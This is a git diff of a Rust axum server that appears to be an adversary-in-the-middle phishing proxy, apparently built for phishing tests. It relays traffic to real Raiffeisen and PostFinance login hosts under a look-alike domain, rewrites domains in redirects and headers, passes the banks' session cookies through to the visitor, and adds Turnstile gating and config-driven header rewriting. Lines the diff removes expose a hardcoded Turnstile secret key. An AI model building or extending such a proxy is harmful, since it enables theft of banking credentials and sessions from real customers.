@@ -1,17 +1,26 @@
-use axum::extract::{Path, RawQuery};
-use axum::http::{HeaderMap, Method, StatusCode};
+mod clearance;
+mod config;
+mod csp;
+mod turnstile;
+
+use crate::config::{load, Config, Mapping, Targets};
+use axum::extract::{Path, Query, RawQuery};
+use axum::http::{HeaderMap, HeaderName, Method, StatusCode};
 use axum::response::IntoResponse;
 use axum::routing::{delete, get, post, put};
-use axum::{Router, extract};
+use axum::{Json, Router};
 use bytes::Bytes;
 use cookie::CookieBuilder;
 use lazy_static::lazy_static;
+use notify::{EventKind, RecursiveMode, Watcher};
 use regex::{Captures, Regex, Replacer};
 use reqwest::redirect::Policy;
 use reqwest::{Body, Client, ClientBuilder, Url};
 use serde::Deserialize;
-use std::collections::{HashMap, HashSet};
+use std::collections::HashSet;
+use std::path;
 use std::string::ToString;
+use std::sync::{mpsc, Arc, RwLock};
 use tower::ServiceBuilder;
 use tower_http::services::ServeDir;
 
@@ -20,6 +29,10 @@ lazy_static! {
         .redirect(Policy::none())
         .build()
         .unwrap();
+}
+
+lazy_static! {
+    static ref loaded_config: Arc<RwLock<Option<Config>>> = Arc::new(RwLock::new(None));
 }
 
 #[derive(Deserialize)]
@@ -35,19 +48,71 @@ struct TrunstileResponse {
     error_codes: Option<Vec<String>>,
 }
 
-async fn check_token(extract::Json(payload): extract::Json<CheckToken>) -> impl IntoResponse {
-    let mut params = HashMap::new();
-    params.insert("secret", "0x4AAAAAABeFSCrjw82cBO7ToMQiCrevAYY");
-    params.insert("response", &payload.token);
-    let res = client
-        .post("https://challenges.cloudflare.com/turnstile/v0/siteverify")
-        .json(&params)
-        .send()
-        .await
-        .unwrap();
+async fn check_token(Json(payload): Json<CheckToken>) -> impl IntoResponse {
+    let secret = "";
 
-    let result: TrunstileResponse = res.json().await.unwrap();
+    let result = turnstile::check(&payload.token, secret).await.unwrap();
     println!("Result: {:?}", result);
+}
+
+#[derive(Debug, Deserialize)]
+struct CspParams {
+    session_id: String,
+}
+
+#[axum::debug_handler]
+async fn csp_report(
+    Query(params): Query<CspParams>,
+    Json(report): Json<csp::Root>,
+) -> impl IntoResponse {
+}
+
+fn active_config(config: &Option<Config>, url: &str) -> Option<Targets> {
+    match &config {
+        None => {}
+        Some(config) => {
+            if let Some(targets) = &config.targets {
+                for target in targets {
+                    if target
+                        .url
+                        .iter()
+                        .any(|i| Regex::new(i).unwrap().is_match(url))
+                    {
+                        return Some(target.clone());
+                    }
+                }
+            }
+        }
+    }
+    None
+}
+
+fn filter_headers<TTransformer>(
+    request_header: &mut HeaderMap,
+    mapping: &Mapping,
+    transformer: TTransformer,
+) where
+    TTransformer: Fn(String) -> String,
+{
+    if let Some(headers) = &mapping.headers {
+        for header_config in headers {
+            if let Some(value) = &header_config.value {
+                let key = HeaderName::from_bytes(header_config.key.as_bytes()).unwrap();
+                request_header.insert(key, value.parse().unwrap());
+            }else{
+                request_header.remove(&header_config.key);
+            }
+        }
+    }
+
+    if mapping.rewrite {
+        for (key, value) in &request_header.clone() {
+            if let Ok(value) = value.to_str() {
+                let new_value = transformer(value.to_string());
+                request_header.insert(key, new_value.parse().unwrap());
+            }
+        }
+    }
 }
 
 async fn get_root(
@@ -59,18 +124,24 @@ async fn get_root(
 ) -> impl IntoResponse {
     let domain = "local-dev.phishtest.cloud:53001";
 
+    let path = path.map(|i| i.0).unwrap_or_else(|| "".to_string());
+
+    let lc = loaded_config.clone();
+    let config = lc.read().unwrap().clone();
+
     // println!("Body: {}", body.len());
 
-    let mut headers = HeaderMap::new();
-    headers.insert(
-        "Content-Security-Policy",
-        format!("default-src 'self' http://*.{domain}/ data:; style-src 'self' http://*.{domain}/ 'unsafe-inline'; script-src 'self' http://*.{domain}/ 'unsafe-inline' 'unsafe-eval'")
-            .parse()
-            .unwrap(),
-    );
-    headers.insert("Referrer-Policy", "same-origin".parse().unwrap());
+    let mut response_headers = HeaderMap::new();
+    let target = active_config(&config, &path);
+    println!("{:?}", target);
 
-    let path = path.map(|i| i.0).unwrap_or_else(|| "".to_string());
+    // response_headers.insert(
+    //     "Content-Security-Policy",
+    //     format!("default-src 'self' http://*.{domain}/ data:; style-src 'self' http://*.{domain}/ 'unsafe-inline'; script-src 'self' http://*.{domain}/ 'unsafe-inline' 'unsafe-eval'")
+    //         .parse()
+    //         .unwrap(),
+    // );
+    // response_headers.insert("Referrer-Policy", "same-origin".parse().unwrap());
 
     // println!("Start domain: {}", STANDARD_NO_PAD.encode("www.raiffeisen.ch"));
 
@@ -84,26 +155,42 @@ async fn get_root(
 
     // println!("Host: {}->{}", host, subdomain);
 
-    if path.contains("rfdwdc/") || path.contains("fcs2/") {
-        return (StatusCode::NOT_FOUND, headers, Bytes::new());
-    }
-    if path.contains("unsupported-browser/") {
-        return (StatusCode::NOT_FOUND, headers, Bytes::new());
+    if let Some(target) = &target {
+        if let Some(static_response) = &target.static_response {
+            return (StatusCode::from_u16(static_response.status).unwrap(), response_headers, Bytes::new());
+        }
     }
 
+    // if path.contains("rfdwdc/") || path.contains("fcs2/") {
+    //     return (StatusCode::NOT_FOUND, response_headers, Bytes::new());
+    // }
+    // if path.contains("unsupported-browser/") {
+    //     return (StatusCode::NOT_FOUND, response_headers, Bytes::new());
+    // }
+
+    // fixed removals
     request_header.remove("host");
     request_header.remove("origin");
-    request_header.remove("referer");
     request_header.remove("accept-encoding");
     request_header.remove("content-length");
-    // println!("Headers: {:?}", request_header);
+
+    if let Some(target) = &target {
+        if let Some(mapping) = &target.request {
+            filter_headers(&mut request_header, mapping, |i| {
+                reverse_translate_domains(i, domain)
+            });
+        }
+    }
+
+    // println!("{:#?}", request_header);
+    // request_header.remove("referer");
 
     let mut url = Url::parse(&format!("https://{subdomain}/{path}")).unwrap();
     if let Some(query) = params {
         url.set_query(Some(query.as_str()));
     }
 
-    println!("Url: {}", url);
+    // println!("Url: {}", url);
 
     // transform post-body
     if let Ok(string_post_content) = String::from_utf8(body.to_vec()) {
@@ -113,7 +200,7 @@ async fn get_root(
     let res = client
         .request(method, url)
         .headers(request_header)
-        .body(Body::from(body)) //TODO inspect
+        .body(Body::from(body))
         .send()
         .await
         .unwrap();
@@ -123,82 +210,37 @@ async fn get_root(
         if let Some(path) = cookie.path() {
             builder = builder.path(path);
         }
-        headers.append("Set-Cookie", builder.build().to_string().parse().unwrap());
+        response_headers.append("Set-Cookie", builder.build().to_string().parse().unwrap());
     }
 
     println!("Response: {:?}", res);
 
     let status_code = res.status();
-    // println!("Status: {}", status_code);
-    // match (status_code) {
-    //     StatusCode::MOVED_PERMANENTLY => {
-    //         let location = res.headers().get("location").unwrap().to_str().unwrap();
-    //         let target = translate_domains(location.to_string(), domain, true);
-    //         headers.insert("Location", target.parse().unwrap());
-    //
-    //         return (StatusCode::MOVED_PERMANENTLY, headers, Bytes::new());
-    //     }
-    //     StatusCode::TEMPORARY_REDIRECT => {
-    //         let location = res.headers().get("location").unwrap().to_str().unwrap();
-    //         let target = translate_domains(location.to_string(), domain, true);
-    //         headers.insert("Location", target.parse().unwrap());
-    //
-    //         return (StatusCode::TEMPORARY_REDIRECT, headers, Bytes::new());
-    //     }
-    //     _ => {}
-    // }
-
-    let validator = HashSet::from(["login.raiffeisen.ch", "ebanking.raiffeisen.ch"]);
-
-    if let Some(location) = res.headers().get("location") {
-        let target = translate_domains(
-            location.to_str().unwrap().to_string(),
-            domain,
-            true,
-            validator.clone(),
-        );
-        headers.insert("Location", target.parse().unwrap());
-    }
-
-    if let Some(content_type) = res.headers().get("Content-Type") {
-        headers.insert("Content-Type", content_type.clone());
-    }
-
-    res.headers().iter().for_each(|(key, value)| {
-        if !headers.contains_key(key) && key != "location" {
-            // if let Ok(value) = value.to_str() {
-            //     headers.insert(
-            //         key.clone(),
-            //         translate_domains(value.to_string(), domain, true)
-            //             .parse()
-            //             .unwrap(),
-            //     );
-            // } else {
-            //     headers.insert(key.clone(), value.clone());
-            // }
+    
+    let ignored = HashSet::from(["set-cookie"]);
+    for (key, value) in res.headers() {
+        if ignored.contains(&key.as_str()) {
+           continue; 
         }
-    });
+        response_headers.insert(key, value.clone());
+    }
 
-    let transfer_headers = vec!["post_flow_redirect", "x-forward-url"];
-    for header in transfer_headers {
-        if let Some(value) = res.headers().get(header) {
-            if let Ok(value) = value.to_str() {
-                headers.insert(
-                    header,
-                    translate_domains(value.to_string(), domain, true, validator.clone())
-                        .parse()
-                        .unwrap(),
-                );
-            } else {
-                headers.insert(header, value.clone());
-            }
+    let validator = HashSet::from(["login.raiffeisen.ch", "ebanking.raiffeisen.ch", "www.postfinance.ch"]);
+
+    response_headers.remove("transfer-encoding");
+    response_headers.remove("content-length");
+    response_headers.remove("keep-alive");
+    response_headers.remove("connection");
+
+    if let Some(target) = &target {
+        if let Some(mapping) = &target.response {
+            filter_headers(&mut response_headers, mapping, |i| {
+                translate_domains(i, domain, true, validator.clone())
+            });
         }
     }
 
-    headers.remove("transfer-encoding");
-    headers.remove("content-length");
-
-    println!("Headers: {:?}", headers);
+    // println!("Headers: {:?}", response_headers);
 
     let mut content = res.bytes().await.unwrap();
 
@@ -208,11 +250,41 @@ async fn get_root(
 
     // builder.body(content).unwrap()
     // (headers, )
-    (status_code, headers, content)
+    (status_code, response_headers, content)
 }
 
 #[tokio::main]
 async fn main() {
+    let (tx, rx) = mpsc::channel();
+
+    let mut watcher = notify::recommended_watcher(tx).unwrap();
+
+    // Add a path to be watched. All files and directories at that path and
+    // below will be monitored for changes.
+    watcher
+        .watch(path::Path::new("config.toml"), RecursiveMode::NonRecursive)
+        .unwrap();
+
+    let config = load("config.toml").unwrap();
+    {
+        let mut guard = loaded_config.write().unwrap();
+        *guard = Some(config);
+        println!("Config applied");
+    }
+    tokio::spawn(async move {
+        for item in rx {
+            if let Ok(event) = item {
+                if let EventKind::Modify(_) = event.kind {
+                    if let Ok(config) = load("config.toml") {
+                        let mut guard = loaded_config.write().unwrap();
+                        *guard = Some(config);
+                        println!("Config applied");
+                    }
+                }
+            }
+        }
+    });
+
     // Convert the proxy to a router and use it in your Axum application
     let app: Router = Router::new()
         .route("/", get(get_root))
@@ -220,6 +292,7 @@ async fn main() {
         .route("/{*path}", delete(get_root))
         .route("/{*path}", post(get_root))
         .route("/{*path}", put(get_root))
+        .route("/_api/csp", post(csp_report))
         .route("/_clearance/check", post(check_token))
         .nest_service(
             "/_clearance",
